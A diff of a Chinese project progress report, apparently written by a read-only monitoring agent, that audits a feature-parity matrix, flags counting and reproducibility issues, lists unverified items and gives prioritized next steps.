-| 6 | **L4 模型剩余（4 ⬜ + 3 🟡）** | `proxy` / `egress` / 三级能力元数据 / TTS-STT；🟡 里 4.1 只 16/48、4.2 只 3 transport、4.9 只 4/18 槽位 | 7 条待补 |
-| 7 | **L5 工具剩余（4 ⬜ + 4 🟡）** | 29 工具 vs 94；缺 code_execution、媒体生成、视觉、TTS、kanban、cronjob、桌面窗口、协作消息、HomeAssistant | 差 65 个工具 |
-| 8 | **L13 插件剩余（1 ⬜ + 4 🟡）** | dashboard 插件契约、懒发现、`all`/`pack` CLI | 5 条待补 |
-| 9 | **L14 安全剩余（0 ⬜ + 4 🟡）** | tirith、egress、`path_security`/`url_safety` 四件套、脱敏出口未全覆盖 | 4 条待补 |
-| 10 | **L12 剩余（1 ⬜ + 3 🟡）** | 19 个平台适配器全是占位；`gateway` 11 子命令全量、peer、monitoring 导出 | 4 条待补 |
+| 1 | **L9 记忆层（5 ⬜ + 3 🟡）** | **剩余最大块**：USER.md 用量自曝头、8 个外部 provider（`available()` 恒 False）、holographic、写入门禁、漂移防护 | 8 条 |
+| 2 | **L4 模型适配（3 ⬜ + 4 🟡）** | `proxy` / `egress` / 三级能力元数据 / TTS-STT；🟡 里 4.1 只 16/48 profile、4.2 只 3 transport、4.9 只 4/18 槽位 | 7 条 |
+| 3 | **L1 入口（3 ⬜ + 5 🟡）** | `serve` / `desktop` / `gui` / `acp`；🟡 里全局 23 flag 与二级/三级实现率 | 8 条 |
+| 4 | **L5 工具剩余（2 ⬜ + 4 🟡）** | 缺媒体生成、视觉、TTS、kanban、cronjob、桌面窗口、协作消息、HomeAssistant | 差 65 个工具 |
+| 5 | **L7 剩余（2 ⬜ + 3 🟡）** | hub 远端索引、sync 三方合并、`skills_guard` 107 条威胁模式 | 5 条 |
+| 6 | **L13 插件（1 ⬜ + 4 🟡）** | dashboard 插件契约、懒发现、`all`/`pack` CLI | 5 条 |
+| 7 | **L10 持久化（1 ⬜ + 5 🟡）** | 🟡 集中在 10.1（写侧未统一）、10.4（压缩阈值）、10.9（非影子 git）、10.11（无 schema_version 表）、10.13（19 子命令实现 8） | 6 条 |
+| 8 | **L2 核心循环（1 ⬜ + 3 🟡）** | 心跳判卡死、swarm 调度、后台学习回路 | 4 条 |
+| 9 | **L8 MCP（2 ⬜ + 2 🟡）** | OAuth 真流程、optional-mcps 63 模板、schema 缓存 | 4 条 |
+| 10 | **L15 可观测性（2 ⬜）** | metrics schema（**轮中在飞**）、observability exporter 插件 | 2 条 |
 
 ---
 
 ## 风险与漂移
 
-### R1 🔴 **计数工具的口径 bug：`matrix_stats.py` 把 1 条 🟡 算成了 ✅（本轮最重要）**
+### R1 🟠 **轮中工作树被破坏：4 个未跟踪文件在 11:58 落地，导致我的 mypy 读数与你的不同**
 
-```python
-# scripts/matrix_stats.py:37  count()
-if DONE in line:          # ← 整行包含 ✅ 就算完成
-    done += 1
+- **轮初** `git status --porcelain` 为空 ✓（与你说的一致）
+- **轮末** 出现 4 个未跟踪文件：`app/metrics_schema.py`（mtime **11:58:01**）、`app/exporters.py`、`app/cli/commands/observability_extra.py`、`tests/test_observability_export.py` —— **有人在我巡检期间开始写 W12 剩余部分**
+- 后果：`mypy` 我读到 **122 files / 2 errors**，而你读到 **120 files / clean**。两个错误**全部落在未跟踪的 `metrics_schema.py`**（`:49` 与 `:63`，都是 `_check(isinstance(x, str) and x, ...)` 让 mypy 推出 `Literal[False] | str`）：
 ```
-而它的**自己的 docstring（:14）写的是**「状态取该行里出现的**第一个**标记」——**实现与文档不符**。
+app\metrics_schema.py:49: error: Argument 1 to "_check" has incompatible type "Literal[False] | str"; expected "bool"
+app\metrics_schema.py:63: error: ... 同上
+Found 2 errors in 1 file (checked 122 source files)
+```
+- **判定：不是已提交代码的回归**（120 + 2 个新 app 文件 = 122，数字完全对得上）。**已提交树 mypy 仍 clean。**
+- **教训（对我自己）**：基线要在**轮末再确认一次 `git status`**，不能只在轮初看一次。本轮我第一眼看到干净就默认了，直到跑 mypy 发现文件数不对才回头查——**如果我只报"mypy 2 errors"而不查 git，就会误报一次回归**。
+- **轮末复查（写完本报告后再次 `git status`）**：条目从 4 涨到 **6**，新增 ` M backend/app/cli/commands/__init__.py`（**有人正在把 W12 的命令注册进去**）与 ` M PROGRESS.md`（本报告自身）。→ **在飞施工仍在继续**，下一轮开头 `REGISTRY` 数字很可能又变（顶层 81 可能涨）。**本报告的所有硬口径均以 `HEAD 5c7d534` 的已提交状态为准。**
 
-后果：`MATRIX 10.1` 状态列是 **🟡**，但证据栏含我上轮建议的措辞「→ **变 ✅ 的路径**」→ 被算成 done。
+### R2 🟡 **10.5 的「177,015 字节」不可复现（见 A⑥）**
 
-| 口径 | ✅ | 🟡 | ⬜ | 完成度 |
-|---|---|---|---|---|
-| `matrix_stats.py`（整行包含） | **98** | 44 | 39 | 54.1% |
-| **状态列（权威）** | **97** | **45** | 39 | **53.6%** |
+机制成立、算术自洽，但**与本机 Hermes 现库不符**（我实测 646,148 字节 / 18 份）。目前**不构成独立证据**。建议换数字或补查询口径。
 
-**全表只有 1 行**是「状态列符号 ≠ 行内唯一符号」：`10.1`（行内同时出现 ✅ 和 🟡）。所以修法很小：
-1. `count()` 改成**读状态列**（按未转义的 `|` 切段取第 5 段）；
-2. 加一条断言：**每行状态列必须是且仅是 ✅/🟡/⬜ 之一**（现在 181 行都满足，除了符号唯一性）；
-3. 加一条断言：**行内不得出现与状态列不同的状态符号**（当前唯一违反者 10.1）。
+### R3 🟡 **L2 的计数：你说 ✅6/🟡2/⬜1（=9），我实测 ✅6/🟡3/⬜1（=10）**
 
-> 讽刺的是：这个工具当初就是为"分母不能虚高"造的（`duplicate_ids` 门禁），结果**分子**被同一个 bug 污染了 1 条。而且污染源是我上轮写的建议措辞——**以后建议里不要写字面 ✅ 符号**，改写成"可转 done"。
-
-### R2 🟡 **我自己的统计方法也有同一缺陷（已修正，需披露）**
-
-第 2–6 轮我用的是 PowerShell 整行 `-match '✅'`，与本轮 `matrix_stats.py` 同一个口径。本轮改用**状态列解析**后才发现差异。
-- 第 6 轮报的 83 条是否受影响：**无法回溯确认**（当时 10.1 的 🟡 证据栏还没有 ✅ 字样，大概率准确），但**从本轮起统一用状态列口径**，并在报告里注明。
-- 教训：**"扫描符号"永远不可靠**——报告文本里会出现被引用的符号。必须定位到结构化字段。
-
-### R3 🟡 **9.10 的 8 个 provider 名与 Hermes 的 8 个只有 `mem0` 重合**
-
-- Hermes 侧（MATRIX 条目原文）：`byterover / hindsight / holographic / honcho / mem0 / openviking / retaindb / supermemory`
-- Orbit 侧实测：`local / file / jsonl`（真实现 3 个）+ `mem0 / zep / letta / chroma / pgvector`（接口 5 个）
-→ **接口数量 8 对上了，但名字只有 `mem0` 重合**。这不算虚报（🟡 且写明了 `available()` 恒 False），但建议在证据栏注明「**provider 名单按可用生态选，不是照抄 Hermes 的 8 家**」，否则下轮容易误以为"8 个 provider 已对齐"。
+总数 10 条，你的三个数字加起来是 9 —— **少算了 1 条 🟡**。以我实测为准：**L2 = ✅6 · 🟡3 · ⬜1**。
 
 ### R4 🟡 **未验证项（如实标注）**
 
 | 项 | 为什么没验 |
 |---|---|
-| 9.15（`orbit memory {setup,status,off,reset}`）、14.6/14.10 之一 | 本轮新增 14 条里未逐条复核的 2 条 |
-| 8.6 心跳宽限秒数与退避序列 | 只核到机制与常量引用，未逐个核数值（连续 2 轮如此） |
-| `orbit chat` 交互式、`gateway start`、`cron run`、`backup create/restore`、`config edit`、`doctor --fix/--live` | 全部会改状态或真发请求 → 未运行 |
-| `matrix_stats.py` 端到端 exit 1（重复编号门禁） | 只读固定 MATRIX.md、无路径参数；实跑需改禁改区（第 4 轮起一直如此） |
+| 10.12 的 `sessions reindex` / `sessions search` 实跑 | 会写 `fts.sqlite` → 未运行；只核了代码与 docstring 里的本机实测记录 |
+| 8.6 心跳宽限秒数与退避序列 | 只核到机制与常量引用（连续 3 轮如此） |
+| 9.15 / 14.6 / 14.10 等未抽查的新 ✅ | 本轮 15 条转 ✅ 中复核 11 条 |
+| `orbit chat` 交互、`gateway start`、`cron run`、`backup create/restore`、`config edit`、`doctor --fix/--live` | 会改状态或真发请求 → 未运行 |
+| `matrix_stats.py` 的重复编号端到端 exit 1 | 只读固定 MATRIX.md、无路径参数（第 4 轮起一直如此） |
 
-### R5 🟢 **上轮两条建议都已落地（记录以免重复提）**
+### R5 🟢 **上轮建议全部落地（记录以免重复提）**
 
-| 上轮建议 | 本轮实测 | 状态 |
-|---|---|---|
-| 保住干净基线并写进文档口径 | 本轮仍是独占跑（1760 passed / 153.74s），且我复核到 ruff/mypy 全绿 | **已落地** |
-| L4 的 fallback 接线（全表 ROI 最高） | `get_model()` 走 `FallbackChain` + `CredentialPool`，返回 `Route`；4.5/4.6 转 ✅，14 条用例 | **已落地** |
-| （上轮 R2）10.1 补「写侧未统一」的理由 | MATRIX 10.1 证据栏**逐字采纳**了我的措辞（含「引用数全是 0」「变 ✅ 的路径」） | **已落地**（但引发了 R1） |
+| 上轮建议 | 本轮实测 |
+|---|---|
+| 修 `count()` 读状态列 | ✅ 已修，且**多修了一层**（转义竖线） |
+| 加两条格式门禁 | ✅ `status_column_problems()` 已实现，docstring 记录成因 |
+| 清掉 10.1 的「变 ✅」污染 | ✅ 已改「可转 done」，全表无第二个符号 |
+| 给 2.6/2.7 补接线点 | ✅ MATRIX 已写；L2 从 ✅1 → ✅6 |
 
 ---
 
@@ -307,15 +304,15 @@ if DONE in line:          # ← 整行包含 ✅ 就算完成
 
 按优先级：
 
-1. **【P0】修 `matrix_stats.py::count()` 的口径**（R1）：改成读状态列，并加两条断言（状态列必须是三符号之一；行内不得出现与状态列不同的符号）。改完后表头应显示 **97 / 45 / 39 = 53.6%**。这一条会同时消除"分母门禁"与"分子虚高"两类风险。
-2. **【P0】给 2.6 / 2.7 补「接线点」**：`Nodes.ask_model` 的 except 分支 → `errors.classify(exc)` → 仅 `RETRYABLE` 才重试。你撤回的处置是对的，但**接线点没写下来**，下一个人要重新推导。
-3. **【P1】L2 是现在最弱的一层（6 ⬜ + 3 🟡，10 条里只 ✅1）**：它恰好是"接线类"欠账（错误分类、压缩重试两条已经写好但没接）。**把 2.6/2.7 接上，L2 立刻从 10% 涨到 30%**，比新开一层便宜得多。
-4. **【P1】9.10 补一句 provider 名单口径**（R3），并考虑把 `local/file/jsonl` 之外的 5 个接口**要么标"仅为契约占位"**、要么换成 Hermes 的真实名单（byterover/honcho/…），否则"8 个 provider"这个数字会被误读。
-5. **【P1】L10 的 10.1 该决定方向了**：要么把 cron/gateway/agent 的写入过 plane（变 ✅），要么把条目判据改成"统一读视图"并把"同库同表"降级为差异说明。现在这条 🟡 已经挂了 2 轮，且它的证据栏含 ✅ 字样正在污染计数。
-6. **【P2】把"状态列唯一性"做成测试**：`tests/test_matrix_format.py` 里断言 181 行的状态列 ∈ {✅,🟡,⬜} 且行内无第二个状态符号。这样 R1 这类问题会在 CI 里当场红，而不是靠监视者肉眼发现。
-7. **【P2】每条 ✅ 补「验证命令」列**：本轮 16.1 / 9.4 / 9.5 三条的证据质量极高（现场读文件、数调用次数、断言补偿后状态）；把这种"可一键复跑"的断言补到其余条目。
-8. **【P2】复核 `08` 的「15 条已声明未消费」剩余 13 条**：连续 5 轮未核。本轮顺带看到 `nodes.py:139 context_meta.setdefault("compressed", {})` 仍是空占位——正是那 15 条之一。
+1. **【P0】把 R1 的教训固化成流程**：基线三件套改成「轮初 `git status` → 跑全量 → **轮末再 `git status`**」，三者不一致时以"已跟踪文件"为准重算。本轮我差点把在飞文件的 mypy 错误报成回归。
+2. **【P0】处理 10.5 的 177,015 数字**（R2）：换成可复现的 **646,148 字节 / 18 份**（附我用的只读查询），或删掉数字只留机制。**这是本轮唯一一条"引用了不可复现数字"的 ✅**，而它的机制本身是硬的，改一下就行。
+3. **【P0】立一条"如实说没有 ≠ 有"的抽查规则**（你提的那条）：凡是 `done` 的命令，验证输出是"真的做了"还是"解释为什么没做"。本轮 egress 6 条已修，建议在 `matrix_stats` 里加一条启发式——**扫描 `done` 命令的输出文案里是否含「未实现 / 没有这一层 / 尚未支持」**，命中就报警。
+4. **【P1】L9 记忆层是剩余最大块（5 ⬜ + 3 🟡，8 条）**：且缺的多是**可离线验证、测试好写**的（USER.md 用量头、写入门禁、漂移防护、CJK 已由 10.12 的 `fts.sqlite` 铺好路）。Orbit 已有 memories 表 + USER.md 底座，比新开层便宜。
+5. **【P1】L4 的 4 条 🟡 值得一次性收口**：4.1（16/48 profile）、4.2（3/5 transport）、4.9（4/18 槽位）、4.4 已 ✅。**加 profile 是纯数据活**（照 06 调研的表抄），性价比高于写新逻辑。
+6. **【P2】10.1 该决断了**（🟡 已挂 3 轮）：要么让 cron/gateway/agent 的写入过 plane（变 ✅），要么把条目判据改成"统一读视图"、把"同库同表"降为差异说明。现在它挂着 🟡，且**它的证据栏里不能再出现 ✅ 字样**（门禁已防，但措辞上还是容易踩）。
+7. **【P2】把"轮中在飞文件"做成可见状态**：建议在 `matrix_stats.py` 里加一行「未跟踪文件 N 个（可能影响 mypy/测试读数）」的提示。本轮若有这行，我一眼就能看出 mypy 差异的来源。
+8. **【P2】复核 `08` 的「15 条已声明未消费」剩余 13 条**：连续 6 轮未核。本轮顺带看到 `nodes.py:139 context_meta.setdefault("compressed", {})` 仍是空占位——正是那 15 条之一。
 
 ---
 
-*本报告由 monitor 角色只读生成。本轮新增 14 条 ✅ 复核 12 条（86%），你点名的 7 条**全部撑得住**、4 条 🟡 **全部标得准**；`errors.py` 撤回的处置我判为**正确**。最重要的发现是计数工具把 1 条 🟡 算成了 ✅（真实 53.6%，不是 54.1%），且污染源是我上轮建议里的 ✅ 字面符号。未验证项单列，不混进完成项。*
+*本报告由 monitor 角色只读生成。本轮 15 条转 ✅ 复核 11 条（73%），你点名的 7 条里 **6 条完全撑得住、1 条（10.5）机制成立但引用的数字不可复现**；两处披露**全部复核成立**；`test_graph` 竞态**我更正了自己第 3–7 轮的误判**（"负载敏感"→"竞态，已修复"）。未验证项单列，不混进完成项。*
